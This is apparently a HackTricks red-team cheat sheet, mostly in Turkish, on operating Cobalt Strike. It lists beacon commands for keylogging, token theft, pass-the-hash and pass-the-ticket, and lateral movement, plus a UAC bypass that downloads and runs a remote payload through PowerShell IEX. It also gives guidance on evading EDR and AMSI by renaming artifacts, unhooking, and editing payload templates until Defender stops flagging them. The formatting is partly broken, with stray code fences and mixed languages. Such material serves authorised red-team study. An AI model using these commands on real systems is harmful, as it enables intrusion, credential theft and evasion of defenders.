# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Dinleyiciler

### C2 Dinleyicileri

`Cobalt Strike -> Dinleyiciler -> Ekle/Düzenle` ardından dinlemek için yeri seçebilir, hangi tür beacon kullanacağınızı (http, dns, smb...) ve daha fazlasını belirleyebilirsiniz.

### Peer2Peer Dinleyicileri

Bu dinleyicilerin beacon'ları doğrudan C2 ile konuşmak zorunda değildir, diğer beacon'lar aracılığıyla iletişim kurabilirler.

`Cobalt Strike -> Dinleyiciler -> Ekle/Düzenle` ardından TCP veya SMB beacon'larını seçmeniz gerekir.

* **TCP beacon, seçilen portta bir dinleyici ayarlayacaktır**. TCP beacon'a bağlanmak için başka bir beacon'dan `connect <ip> <port>` komutunu kullanın.
* **smb beacon, seçilen isimle bir pipename'de dinleyecektir**. SMB beacon'a bağlanmak için `link [target] [pipe]` komutunu kullanmanız gerekir.

### Yükleri Oluşturma ve Barındırma

#### Dosyalarda yük oluşturma

`Saldırılar -> Paketler ->`

* **`HTMLApplication`** HTA dosyaları için
* **`MS Office Macro`** makro içeren bir ofis belgesi için
* **`Windows Executable`** bir .exe, .dll veya hizmet .exe için
* **`Windows Executable (S)`** **stageless** bir .exe, .dll veya hizmet .exe için (stageless, staged'den daha iyidir, daha az IoC)

#### Yükleri Oluşturma ve Barındırma

`Saldırılar -> Web Drive-by -> Scripted Web Delivery (S)` Bu, beacon'ı cobalt strike'dan indirmek için bitsadmin, exe, powershell ve python gibi formatlarda bir script/yürütülebilir dosya oluşturacaktır.

#### Yükleri Barındırma

Barındırmak istediğiniz dosyaya sahip iseniz, `Saldırılar -> Web Drive-by -> Dosyayı Barındır` seçeneğine gidin ve barındırılacak dosyayı ve web sunucu yapılandırmasını seçin.

### Beacon Seçenekleri

<pre class="language-bash"><code class="lang-bash"># Yerel .NET ikili dosyasını çalıştır
execute-assembly </path/to/executable.exe>
# 1MB'den büyük assembly'leri yüklemek için, malleable profilin 'tasks_max_size' özelliğinin değiştirilmesi gerekir.

# Ekran görüntüleri
printscreen    # PrintScr yöntemiyle tek bir ekran görüntüsü al
screenshot     # Tek bir ekran görüntüsü al
screenwatch    # Masaüstünün periyodik ekran görüntülerini al
## Görmek için Görünüm -> Ekran Görüntüleri'ne gidin

# keylogger
keylogger [pid] [x86|x64]
## Görünüm > Tuş Vuruşları ile basılan tuşları görün

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Başka bir süreç içinde portscan eylemi enjekte et
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Powershell modülünü içe aktar
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <buraya powershell komutunu yazın> # Bu, en yüksek desteklenen powershell sürümünü kullanır (opsec değil)
powerpick <cmdlet> <args> # Bu, spawnto tarafından belirtilen bir kurban süreci oluşturur ve daha iyi opsec için UnmanagedPowerShell'ı içine enjekte eder (loglama yok)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # Bu, belirtilen sürece UnmanagedPowerShell'ı enjekte eder.

# Kullanıcı taklidi
## Kimlik bilgileri ile token oluşturma
make_token [DOMAIN\user] [password] # Ağda bir kullanıcıyı taklit etmek için token oluştur
ls \\computer_name\c$ # Oluşturulan token ile bir bilgisayardaki C$'ya erişmeye çalış
rev2self # make_token ile oluşturulan token'ı kullanmayı durdur
## make_token kullanımı, 4624 olayı oluşturur: Bir hesap başarıyla oturum açtı. Bu olay, bir Windows alanında çok yaygındır, ancak Oturum Açma Türü'ne göre filtrelenerek daraltılabilir. Yukarıda belirtildiği gibi, bu, tür 9 olan LOGON32_LOGON_NEW_CREDENTIALS kullanır.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## PID'den token çal
## make_token gibi ama bir süreçten token çalıyor
steal_token [pid] # Ayrıca, bu ağ eylemleri için yararlıdır, yerel eylemler için değil
## API belgelerinden, bu oturum açma türünün "çağrıcının mevcut token'ını klonlamasına izin verdiğini" biliyoruz. Bu nedenle Beacon çıktısı, Taklit Edilen <current_username> diyor - kendi klonlanmış token'ımızı taklit ediyor.
ls \\computer_name\c$ # Oluşturulan token ile bir bilgisayardaki C$'ya erişmeye çalış
rev2self # steal_token'dan token kullanmayı durdur

## Yeni kimlik bilgileri ile süreci başlat
spawnas [domain\username] [password] [listener] # Okuma erişimi olan bir dizinden yapın: cd C:\
## make_token gibi, bu Windows olayı 4624'ü oluşturacaktır: Bir hesap başarıyla oturum açtı ama 2 (LOGON32_LOGON_INTERACTIVE) oturum açma türü ile. Çağrıcı kullanıcıyı (TargetUserName) ve taklit edilen kullanıcıyı (TargetOutboundUserName) detaylandıracaktır.

## Sürece enjekte et
inject [pid] [x64|x86] [listener]
## OpSec açısından: Gerçekten gerekmedikçe çapraz platform enjekte etmeyin (örneğin x86 -> x64 veya x64 -> x86).

## Hash'i geç
## Bu modifikasyon süreci, LSASS belleğini yamanmayı gerektirir ki bu yüksek riskli bir eylemdir, yerel yönetici ayrıcalıkları gerektirir ve Korunan Süreç Işık (PPL) etkinse pek uygulanabilir değildir.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Mimikatz ile hash'i geç
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## /run olmadan, mimikatz bir cmd.exe başlatır, eğer bir masaüstü kullanıcısı olarak çalışıyorsanız, shell'i görecektir (eğer SYSTEM olarak çalışıyorsanız, iyi gidiyorsunuz)
steal_token <pid> # Mimikatz tarafından oluşturulan süreçten token çal

## Bilet geçişi
## Bir bilet talep et
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Yeni bilet ile kullanılacak yeni bir oturum açma oturumu oluştur (ele geçirilen birini üzerine yazmamak için)
make_token <domain>\<username> DummyPass
## Bileti saldırgan makinesine bir powershell oturumundan yazın ve yükleyin
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## SYSTEM'den bilet geçişi
## Bilet ile yeni bir süreç oluştur
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## O süreçten token çal
steal_token <pid>

## Bileti çıkar + Bileti geç
### Biletleri listele
execute-assembly C:\path\Rubeus.exe triage
### LUID ile ilginç bir bileti dök
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Yeni bir oturum açma oturumu oluştur, LUID ve processid'yi not et
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Bileti oluşturulan oturum açma oturumuna ekle
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Son olarak, o yeni süreçten token çal
steal_token <pid>

# Lateral Hareket
## Bir token oluşturulduysa kullanılacaktır
jump [method] [target] [listener]
## Yöntemler:
## psexec                    x86   Bir hizmeti çalıştırmak için bir Service EXE nesnesi kullan
## psexec64                  x64   Bir hizmeti çalıştırmak için bir Service EXE nesnesi kullan
## psexec_psh                x86   Bir hizmeti çalıştırmak için bir PowerShell one-liner kullan
## winrm                     x86   WinRM üzerinden bir PowerShell scripti çalıştır
## winrm64                   x64   WinRM üzerinden bir PowerShell scripti çalıştır
## wmi_msbuild               x64   msbuild inline c# görevi ile wmi lateral hareket (opsec)

remote-exec [method] [target] [command] # remote-exec çıktı döndürmez
## Yöntemler:
## psexec                          Hizmet Kontrol Yöneticisi aracılığıyla uzaktan çalıştır
## winrm                           WinRM (PowerShell) aracılığıyla uzaktan çalıştır
## wmi                             WMI aracılığıyla uzaktan çalıştır

## WMI ile bir beacon çalıştırmak için (jump komutunda yok) sadece beacon'ı yükleyin ve çalıştırın
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe

# Metasploit'e oturum geçişi - Dinleyici aracılığıyla
## Metasploit ana bilgisayarında
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Cobalt'ta: Dinleyiciler > Ekle ve Yükü Yabancı HTTP olarak ayarlayın. Host'u 10.10.5.120, Port'u 8080 olarak ayarlayın ve Kaydet'e tıklayın.
beacon> spawn metasploit
## Yalnızca yabancı dinleyici ile x86 Meterpreter oturumları başlatabilirsiniz.

# Metasploit oturumunu Cobalt Strike'a geçirin - Shellcode enjekte ederek
## Metasploit ana bilgisayarında
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## msfvenom'u çalıştırın ve multi/handler dinleyicisini hazırlayın

## Bin dosyasını Cobalt Strike ana bilgisayarına kopyalayın
ps
shinject <pid> x64 C:\Payloads\msf.bin # x64 bir süreçte metasploit shellcode enjekte et

# Metasploit oturumunu Cobalt Strike'a geçirin
## Stageless Beacon shellcode oluşturun, Saldırılar > Paketler > Windows Executable (S) bölümüne gidin, istenen dinleyiciyi seçin, Çıktı türü olarak Raw'ı seçin ve x64 yükünü kullanın.
## Oluşturulan cobalt strike shellcode'u enjekte etmek için metasploit'te post/windows/manage/shellcode_inject kullanın.

# Pivoting
## Teamserver'da bir socks proxy açın
beacon> socks 1080

# SSH bağlantısı
beacon> ssh 10.10.17.12:22 kullanıcı adı şifre</code></pre>

## Opsec

### Execute-Assembly

**`execute-assembly`**, belirtilen programı çalıştırmak için uzaktan süreç enjekte etme kullanarak bir **kurban süreci** kullanır. Bu, bir süreç içine enjekte etmek için kullanılan belirli Win API'leri nedeniyle çok gürültülüdür ve her EDR bunu kontrol etmektedir. Ancak, aynı süreçte bir şey yüklemek için kullanılabilecek bazı özel araçlar vardır:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Cobalt Strike'da BOF (Beacon Object Files) kullanabilirsiniz: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)

Agressor script `https://github.com/outflanknl/HelpColor`, Cobalt Strike'da `helpx` komutunu oluşturacak ve bu komutlar BOF'lar (yeşil), Frok&Run (sarı) ve benzeri olup olmadığını veya Süreç Yürütme, enjekte etme veya benzeri olup olmadığını belirten renkler koyacaktır. Bu, hangi komutların daha gizli olduğunu bilmeye yardımcı olur.

### Kullanıcı olarak hareket et

`Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` gibi olayları kontrol edebilirsiniz:

- Güvenlik EID 4624 - Alışılmış çalışma saatlerini bilmek için tüm etkileşimli oturum açmaları kontrol edin.
- Sistem EID 12,13 - Kapatma/açma/uyku sıklığını kontrol edin.
- Güvenlik EID 4624/4625 - Geçerli/geçersiz NTLM denemelerini kontrol edin.
- Güvenlik EID 4648 - Bu olay, düz metin kimlik bilgileri kullanılarak oturum açıldığında oluşturulur. Eğer bir süreç bunu oluşturduysa, ikili dosya muhtemelen bir yapılandırma dosyasında veya kod içinde düz metin olarak kimlik bilgilerini içermektedir.

Cobalt Strike'dan `jump` kullanırken, yeni sürecin daha meşru görünmesi için `wmi_msbuild` yöntemini kullanmak daha iyidir.

### Bilgisayar hesaplarını kullanın

Savunucuların kullanıcılar tarafından üretilen garip davranışları kontrol etmesi yaygındır ve **hizmet hesaplarını ve bilgisayar hesaplarını izlemelerinden hariç tutarlar**. Bu hesapları lateral hareket veya ayrıcalık yükseltme yapmak için kullanabilirsiniz.

### Stageless yükleri kullanın

Stageless yükler, ikinci bir aşamayı C2 sunucusundan indirmeleri gerekmediği için staged olanlardan daha az gürültülüdür. Bu, ilk bağlantıdan sonra herhangi bir ağ trafiği oluşturmadıkları anlamına gelir, bu da ağ tabanlı savunmalar tarafından tespit edilme olasılıklarını azaltır.

### Token'lar ve Token Deposu

Token çalarken veya oluştururken dikkatli olun çünkü bir EDR'nin tüm thread'lerin token'larını listelemesi ve **farklı bir kullanıcıya ait bir token'ı** veya hatta SYSTEM'ı bulması mümkün olabilir.

Bu, token'ları **her beacon için** depolamayı sağlar, böylece aynı token'ı tekrar tekrar çalmaya gerek kalmaz. Bu, lateral hareket veya çalınan bir token'ı birden fazla kez kullanmanız gerektiğinde yararlıdır:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Lateral hareket ederken, genellikle **yeni bir token oluşturmak yerine bir token çalmak daha iyidir** veya hash geçişi saldırısı gerçekleştirmek.

### Guardrails

Cobalt Strike, savunucular tarafından tespit edilebilecek belirli komutların veya eylemlerin kullanılmasını önlemeye yardımcı olan **Guardrails** adlı bir özelliğe sahiptir. Guardrails, `make_token`, `jump`, `remote-exec` gibi lateral hareket veya ayrıcalık yükseltme için yaygın olarak kullanılan belirli komutları engellemek üzere yapılandırılabilir.

Ayrıca, [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) deposu, bir yükü çalıştırmadan önce göz önünde bulundurabileceğiniz bazı kontroller ve fikirler içermektedir.

### Bilet şifrelemesi

AD'de biletlerin şifrelemesine dikkat edin. Varsayılan olarak, bazı araçlar Kerberos biletleri için RC4 şifrelemesi kullanır, bu da AES şifrelemesinden daha az güvenlidir ve varsayılan olarak güncel ortamlar AES kullanacaktır. Bu, zayıf şifreleme algoritmalarını izleyen savunucular tarafından tespit edilebilir.

### Varsayılanlardan Kaçının

Cobalt Strike kullanırken varsayılan olarak SMB boruları `msagent_####` ve `"status_####` adını alacaktır. Bu isimleri değiştirin. Cobalt Strike'dan mevcut boruların isimlerini kontrol etmek için şu komutu kullanabilirsiniz: `ls \\.\pipe\`

Ayrıca, SSH oturumları ile `\\.\pipe\postex_ssh_####` adında bir boru oluşturulur. Bunu `set ssh_pipename "<new_name>";` ile değiştirin.

Ayrıca, poext exploitation saldırısında `\\.\pipe\postex_####` boruları `set pipename "<new_name>"` ile değiştirilebilir.

Cobalt Strike profillerinde ayrıca şunları değiştirebilirsiniz:

- `rwx` kullanmaktan kaçınmak
- `process-inject {...}` bloğunda süreç enjekte etme davranışının nasıl çalıştığını (hangi API'lerin kullanılacağı)
- `post-ex {…}` bloğunda "fork and run"ın nasıl çalıştığı
- Uyku süresi
- Belleğe yüklenecek ikililerin maksimum boyutu
- Bellek ayak izi ve DLL içeriği `stage {...}` bloğuyla
- Ağ trafiği

### Bellek taramasını atlatma

Bazı EDR'ler, bazı bilinen kötü amaçlı yazılım imzalarını bellekte tarar. Cobalt Strike, arka kapıyı bellekte şifreleyebilecek `sleep_mask` fonksiyonunu bir BOF olarak değiştirmeyi sağlar.

### Gürültülü süreç enjekte etme

Bir sürece kod enjekte ederken bu genellikle çok gürültülüdür, çünkü **normal bir süreç genellikle bu eylemi gerçekleştirmez ve bunu yapmanın yolları çok sınırlıdır**. Bu nedenle, davranış tabanlı tespit sistemleri tarafından tespit edilebilir. Ayrıca, EDR'ler, **diskte olmayan kod içeren thread'leri tarayarak** bunu tespit edebilir (bununla birlikte, JIT kullanan tarayıcılar gibi süreçler bunu yaygın olarak yapar). Örnek: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID ve PPID ilişkileri

Yeni bir süreç başlatırken, tespit edilmemek için **normal bir ebeveyn-çocuk** ilişkisini sürdürmek önemlidir. Eğer svchost.exec iexplorer.exe'yi çalıştırıyorsa, bu şüpheli görünecektir, çünkü svchost.exe normal bir Windows ortamında iexplorer.exe'nin ebeveyni değildir.

Cobalt Strike'da yeni bir beacon başlatıldığında varsayılan olarak **`rundll32.exe`** kullanan bir süreç oluşturulur. Bu çok gizli değildir ve EDR'ler tarafından kolayca tespit edilebilir. Ayrıca, `rundll32.exe` herhangi bir argüman olmadan çalıştırılır, bu da onu daha da şüpheli hale getirir.

Aşağıdaki Cobalt Strike komutuyla, yeni beacon'ı başlatmak için farklı bir süreç belirleyebilir, bu da onu daha az tespit edilebilir hale getirir:
```bash
spawnto x86 svchost.exe
```
You can aso change this setting **`spawnto_x86` and `spawnto_x64`** in a profile.

### Proxying attackers traffic

Atters bazen araçları yerel olarak çalıştırabilme yeteneğine ihtiyaç duyar, hatta linux makinelerde ve kurbanların trafiğinin araca ulaşmasını sağlamak için (örneğin NTLM relay).

Ayrıca, bazen pass-the-hash veya pass-the-ticket saldırısı yapmak için saldırganın **bu hash veya bileti kendi LSASS sürecine** yerel olarak eklemesi daha gizli olabilir ve ardından bunun üzerinden geçiş yapması, bir kurban makinesinin LSASS sürecini değiştirmekten daha iyi bir yöntemdir.

Ancak, **oluşturulan trafikle dikkatli olmalısınız**, çünkü arka kapı sürecinizden alışılmadık bir trafik (kerberos?) gönderiyor olabilirsiniz. Bunun için bir tarayıcı sürecine geçiş yapabilirsiniz (ancak bir sürece kendinizi enjekte ederken yakalanma riski taşıdığınız için bunu gizli bir şekilde yapmayı düşünün).
```bash

### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:

{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.

#### Resource Kit

The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modifying the detected lines one can generate a template that won't be caught.

Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.

#### Function hooks | Syscall

Function hooking is a very common method of ERDs to detect malicious activity. Cobalt Strike allows you to bypass these hooks by using **syscalls** instead of the standard Windows API calls using the **`None`** config, or use the `Nt*` version of a function with the **`Direct`** setting, or just jumping over the `Nt*` function with the **`Indirect`** option in the malleable profile. Depending on the system, an optino might be more stealth then the other.

This can be set in the profile or suing the command **`syscall-method`**

However, this could also be noisy.

Some option granted by Cobalt Strike to bypass function hooks is to remove those hooks with: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

You could also check with functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




```bash
cd C:\Tools\neo4j\bin  
neo4j.bat console  
http://localhost:7474/ --> Şifreyi değiştir  
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL  

# PowerShell'i değiştir  
C:\Tools\cobaltstrike\ResourceKit  
template.x64.ps1  
# $var_code -> $polop  
# $x --> $ar  
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna  

#artifact kit  
cd  C:\Tools\cobaltstrike\ArtifactKit  
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```


{{#include ../banners/hacktricks-training.md}}
